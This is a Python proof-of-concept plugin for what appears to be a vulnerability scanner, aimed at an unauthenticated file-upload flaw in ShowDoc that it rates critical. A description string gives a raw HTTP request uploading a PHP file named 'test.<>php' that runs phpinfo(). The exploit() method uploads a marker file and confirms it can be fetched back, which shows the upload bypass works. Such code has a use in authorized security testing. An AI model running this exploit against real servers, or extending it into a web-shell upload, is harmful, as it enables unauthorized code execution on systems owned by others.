import uuid

import requests
from urllib3 import encode_multipart_formdata
from PocUtils import PocType, Severity
from PocUtils.Http import Http
from urllib.parse import urljoin


class Poc:
    def __init__(self):
        self.poc_type = PocType.http
        self.target = ""
        self.severity = Severity.critical
        self.detail = """发送如下数据包，会返回文件地址：

```http
POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: 192.168.83.134:29843
Content-Length: 218
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1w4V4ZSJraTyFar1
Origin: http://192.168.83.134:29843
Referer: http://192.168.83.134:29843/web/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundary1w4V4ZSJraTyFar1
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

<?php phpinfo(); ?>
------WebKitFormBoundary1w4V4ZSJraTyFar1--
```"""
        self.name = "ShowDoc文件上传漏洞"

    def check(self):
        client = Http()
        client.url = self.target
        resp = client.get()
        if "/showdoc/server/index.php?s=" in resp.text:
            return True
        else:
            return False

    def exploit(self):
        exp_url = urljoin(self.target, "/index.php?s=/home/page/uploadImg")
        check = uuid.uuid4()
        file_data = {
            'editormd-image-file': ("test.<>php", check.hex.encode()),
            'Content-Type': 'text/plain'
        }
        data = encode_multipart_formdata(file_data)
        res = requests.post(exp_url, headers={'Content-Type': data[1]}, data=data[0]).json()
        if "url" in res.keys():
            s_url = res['url']
            check_text = requests.get(s_url).text
            if check.hex == check_text:
                return True
            else:
                return False
